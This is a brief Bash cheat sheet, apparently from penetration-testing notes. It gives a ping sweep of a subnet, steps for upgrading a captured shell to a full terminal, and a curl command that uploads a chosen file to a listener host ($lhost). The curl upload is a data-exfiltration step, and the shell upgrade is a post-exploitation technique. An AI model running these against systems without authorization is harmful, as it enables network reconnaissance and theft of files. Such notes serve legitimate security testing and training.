# Bash

## Bash oneliner

### Ping sweep

Run ping sweep with Bash.

```sh title:"Bash Run Ping Sweep"
for i in {1..254} ;do (ping -c 1 $first_three_octets.$i | grep "bytes from" &) ;done
```
<!-- cheat
var first_three_octets = printf '%s\n' '192.168.1' '10.10.10' '172.16.0' --- --header 'First three octets'
-->

### Stabilize shell

Start stabilize shell with Bash.

```sh title:"Bash Start Stabilize Shell"
/usr/bin/script -qc /bin/bash /dev/null
\# ^Z
\# stty raw -echo; fg; reset
```
<!-- cheat -->

### Curl file upload

Upload curl file upload with Bash.

```sh title:"Bash Upload Curl File Upload"
curl -F 'file=@$file_to_upload' $lhost
```
<!-- cheat
var file_to_upload
var lhost
-->

